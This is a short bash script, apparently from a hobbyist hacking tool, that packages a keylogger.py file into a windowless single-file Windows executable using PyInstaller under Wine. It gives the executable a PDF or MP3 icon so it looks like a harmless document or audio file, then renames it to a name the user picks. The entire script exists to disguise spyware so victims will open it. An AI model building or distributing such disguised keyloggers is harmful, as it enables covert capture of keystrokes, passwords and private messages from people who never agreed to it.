#!/bin/bash

if  [ -f keylogger.py ]
then
	while [ 1 ]
	do
		echo ""
		echo "------- icon ------- : "
		echo "1. pdf "
		echo "2. mp3 "
		echo ""
		echo -n "Select icon : "
		read icon
		echo ""
		echo "generating keylogger ......"
		if [ $icon -eq 1 ]
		then 
			wine $HOME/.wine/drive_c/Python27/Scripts/pyinstaller.exe --icon=icon/pdf.ico -F --noconsole keylogger.py
			rm -rf keylogger.spec
			rm -rf build
			break
		elif [ $icon -eq 2 ]
		then
			wine $HOME/.wine/drive_c/Python27/Scripts/pyinstaller.exe --icon=icon/mp3.ico -F --noconsole keylogger.py
                        rm -rf keylogger.spec
                        rm -rf build
                        break

		fi
	done
	y="key"
	while [ 1 ]
	do
		echo ""
		echo "Note: dont provide .exe"
		echo -n "Please provide name : "
		read x
		if [ $x != $y ]
		then
			mv dist/keylogger.exe dist/$x.exe
			echo ""
		        echo "keylogger generated in [ dist ] folder "
        		echo ""
			echo "Thank u for using my Tool"
			echo "please subscribe my channel"
			echo "           BBSAD"

			break
		else
			continue
		fi
	done
fi
